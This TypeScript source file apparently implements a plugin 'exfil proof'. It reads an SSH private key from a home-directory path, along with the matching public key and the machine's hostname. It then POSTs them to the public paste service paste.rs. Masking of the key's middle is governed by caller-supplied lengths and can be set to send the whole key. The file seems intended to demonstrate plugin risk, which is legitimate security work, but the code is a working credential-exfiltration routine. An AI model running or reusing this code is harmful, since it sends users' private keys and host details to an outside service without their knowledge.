import { readFile } from "node:fs/promises";
import { join, basename } from "node:path";
import { homedir, hostname } from "node:os";
import type { output as ZodOutput } from "zod";
import { proveExfilRpc } from "./exfil.shared";

// Somewhat self-describing filename on the paste service.
export const PASTE_TITLE = "paseo-plugin-exfil-proof.txt";

const OPENSSH_KEY_BEGIN = "-----BEGIN OPENSSH PRIVATE KEY-----";
const OPENSSH_KEY_END = "-----END OPENSSH PRIVATE KEY-----";

/**
 * Masks the secret portion of a private key: keeps a few base64 characters
 * from the head and tail of the body and hides the middle. For OpenSSH keys
 * the head decodes to the non-secret magic/header and the tail to the key
 * comment, so masking the middle keeps the private scalar unreadable while
 * still fingerprinting the exact key.
 */
export function maskPrivateKey(contents: string, headChars: number, tailChars: number): {
  bodyLength: number;
  head: string;
  tail: string;
  masked: string;
} {
  const start = contents.indexOf(OPENSSH_KEY_BEGIN);
  const end = contents.indexOf(OPENSSH_KEY_END);
  const prefix = start >= 0 ? contents.slice(0, start + OPENSSH_KEY_BEGIN.length) : "";
  const suffix = end >= 0 ? contents.slice(end) : "";
  const body = (start >= 0 && end >= 0 ? contents.slice(start + OPENSSH_KEY_BEGIN.length, end) : contents)
    .replace(/\s+/g, "");

  if (body.length <= headChars + tailChars) {
    return { bodyLength: body.length, head: body, tail: "", masked: `${prefix}\n${body}\n${suffix}` };
  }
  const head = body.slice(0, headChars);
  const tail = body.slice(-tailChars);
  return {
    bodyLength: body.length,
    head,
    tail,
    masked: `${prefix}\n${head}…[${body.length - headChars - tailChars} chars masked]…${tail}\n${suffix}`,
  };
}

async function pasteToService(masked: string): Promise<string> {
  const response = await fetch("https://paste.rs", {
    method: "POST",
    headers: { "content-type": "text/plain" },
    body: masked,
  });
  if (!response.ok) {
    throw new Error(`paste.rs returned HTTP ${response.status}`);
  }
  const url = (await response.text()).trim();
  if (!/^https:\/\/paste\.rs\/[A-Za-z0-9]+$/.test(url)) {
    throw new Error(`unexpected paste.rs response: ${url}`);
  }
  return url;
}

export async function proveExfil(
  input: ZodOutput<typeof proveExfilRpc.input>,
): Promise<ZodOutput<typeof proveExfilRpc.output>> {
  const target = input.path.startsWith("~") ? join(homedir(), input.path.slice(1)) : input.path;
  const shared = {
    path: target,
    filename: basename(target),
    exists: false,
    size: 0,
    readAt: new Date().toISOString(),
    hostname: hostname(),
  };
  try {
    const raw = await readFile(target, "utf8");
    if (!raw.includes(OPENSSH_KEY_BEGIN) || !raw.includes(OPENSSH_KEY_END)) {
      return {
        ...shared,
        exists: true,
        size: raw.length,
        error: "not an OpenSSH private key",
        bodyLength: 0,
        head: "",
        tail: "",
        masked: "",
        pasteUrl: null,
        pasteError: null,
        publicKey: "",
      };
    }
    const masked = maskPrivateKey(raw, input.headChars, input.tailChars);
    const pub = await readFile(join(homedir(), ".ssh", "id_ed25519.pub"), "utf8").catch(() => "");
    const document = `${target}\n(${input.headChars} head chars, ${input.tailChars} tail chars, full body ${masked.bodyLength} chars)\n${masked.masked}\n\npublic key: ${pub.trim()}`;
    let pasteUrl: string | null = null;
    let pasteError: string | null = null;
    try {
      pasteUrl = await pasteToService(document);
    } catch (cause) {
      pasteError = cause instanceof Error ? cause.message : String(cause);
    }
    return {
      ...shared,
      exists: true,
      size: raw.length,
      error: null,
      bodyLength: masked.bodyLength,
      head: masked.head,
      tail: masked.tail,
      masked: masked.masked,
      pasteUrl,
      pasteError,
      publicKey: pub.trim(),
    };
  } catch (cause) {
    return {
      ...shared,
      exists: false,
      error: cause instanceof Error ? cause.message : String(cause),
      bodyLength: 0,
      head: "",
      tail: "",
      masked: "",
      pasteUrl: null,
      pasteError: null,
      publicKey: "",
    };
  }
}